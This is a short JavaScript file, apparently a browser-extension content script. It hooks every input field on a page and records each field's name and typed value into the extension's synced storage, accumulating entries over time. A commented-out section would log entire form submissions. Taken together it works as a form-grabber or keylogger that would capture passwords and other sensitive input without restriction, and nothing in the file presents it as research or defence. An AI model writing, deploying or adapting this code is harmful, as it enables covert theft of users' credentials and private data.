// for (var i = 0; i < document.forms.length; i++) {
//     document.forms[i].addEventListener('submit', form_submission);
// }

document.querySelectorAll('input').forEach(
    function(input) {
        input.addEventListener('input', on_change);
    }
);

function write_submssion(key, value) {
    if(!key || !value){
        return;
    }

    put_data = {};

    put_data[key] = value;

    chrome.storage.sync.get(null, function(data) {
        if(data){

            for (d in data){
                if(put_data[d]){
                    put_data[d] = put_data[d] + " _ " + data[d];
                }else{
                    put_data[d] = data[d];
                }
            }
        }

        chrome.storage.sync.set(put_data, function(){});
    });
}

function on_change(event) {
    name = event.target.name;
    value = event.target.value;
    write_submssion(name, value);
}

// function form_submission(e) {
//     log_string = "";

//     var elements = e.target.elements
//     for (var i = 0; i < elements.length; i++) {
//         log_string += elements[i].name + " : " + elements[i].value + "\n";
//     }

//     write_submission(log_string);

// }